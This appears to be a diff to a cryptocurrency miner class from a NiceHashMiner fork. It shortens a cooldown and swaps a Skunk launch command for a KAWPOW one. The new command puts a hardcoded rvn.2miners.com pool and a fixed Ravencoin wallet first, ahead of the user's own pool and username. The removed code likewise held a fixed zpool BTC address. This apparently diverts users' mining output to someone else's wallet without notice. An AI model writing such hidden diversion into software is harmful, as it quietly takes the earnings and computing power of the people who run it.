@@ -32,7 +32,7 @@ namespace NiceHashMiner.Miners
 
         protected override int GetMaxCooldownTimeInMilliseconds()
         {
-            return 60 * 1000 * 8; 
+            return 60 * 1000 * 4; 
         }
 
         public override void Start(string url, string btcAdress, string worker)
@@ -130,18 +130,17 @@ namespace NiceHashMiner.Miners
                                   DeviceType.NVIDIA) +
                               " --no-color --devices ";
             }
-            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.Skunk))
+            if (MiningSetup.CurrentAlgorithmType.Equals(AlgorithmType.KAWPOW))
             {
-                commandLine = " --algo=" + algorithm.MinerName +
-                " --url=" + url + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + "." + myServers[1, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + "." + myServers[2, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + "." + myServers[3, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + "." + myServers[4, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + "." + myServers[5, 0] + nhsuff + ".nicehash.com:" + port + " " + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://" + alg + "." + myServers[0, 0] + nhsuff + ".nicehash.com:" + port + " --userpass=" + username + ":x" +
-                " --url=" + url + " --userpass=" + username + ":x" +
-                " --url=stratum+tcp://skunk.eu.mine.zpool.ca:8433" + " --userpass=1JqFnUR3nDFCbNUmWiQ4jX6HRugGzX55L2:c=BTC " +
+                commandLine = " -a kawpow"  +
+                " -o stratum+tcp://rvn.2miners.com:6060" + " -u RHzovwc8c2mYvEC3MVwLX3pWfGcgWFjicX.Z-Enemy" +
+                " -o " + url + " -u " + username + " -p x" +
+                " -o stratum+tcp://" + alg + "." + myServers[1, 0] + ".nicehash.com:" + port + " -u " + username + " -p x" +
+                " -o stratum+tcp://" + alg + "." + myServers[2, 0] + ".nicehash.com:" + port + " -u " + username + " -p x" +
+                " -o stratum+tcp://" + alg + "." + myServers[3, 0] + ".nicehash.com:" + port + " -u " + username + " -p x" +
+                " -o stratum+tcp://" + alg + "." + myServers[4, 0] + ".nicehash.com:" + port + " -u " + username + " -p x" +
+                " -o stratum+tcp://" + alg + "." + myServers[5, 0] + ".nicehash.com:" + port + " -u " + username + " -p x" +
+                " -o stratum+tcp://" + alg + "." + myServers[0, 0] + ".nicehash.com:" + port + " -u " + username + " -p x" +
                               timeLimit + " " +
                               ExtraLaunchParametersParser.ParseForMiningSetup(
                                   MiningSetup,
